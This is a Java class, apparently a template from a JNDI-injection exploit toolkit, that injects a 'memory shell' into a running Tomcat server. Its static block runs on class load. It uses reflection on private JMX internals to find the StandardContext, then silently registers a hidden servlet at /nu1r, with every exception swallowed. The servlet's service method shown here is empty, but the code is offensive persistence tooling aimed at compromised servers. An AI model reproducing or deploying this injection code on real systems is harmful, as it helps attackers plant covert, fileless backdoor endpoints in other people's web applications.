package com.nu1r.jndi.template.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import java.lang.reflect.Field;
import java.util.Set;

public class TSMSFromJMXS implements Servlet {

    static {
        try {
            String servletName = "nu1r" + System.nanoTime();
            String urlPattern  = "/nu1r";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot的jmx中为Tomcat而非Catalina
                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);

                if (standardContext.findChild(servletName) == null) {
                    Wrapper wrapper = standardContext.createWrapper();
                    wrapper.setName(servletName);
                    standardContext.addChild(wrapper);
                    Servlet servlet = new TSMSFromJMXS();
                    wrapper.setServletClass(servlet.getClass().getName());
                    wrapper.setServlet(servlet);
                    ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                    registration.addMapping(urlPattern);
                }
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
    }
}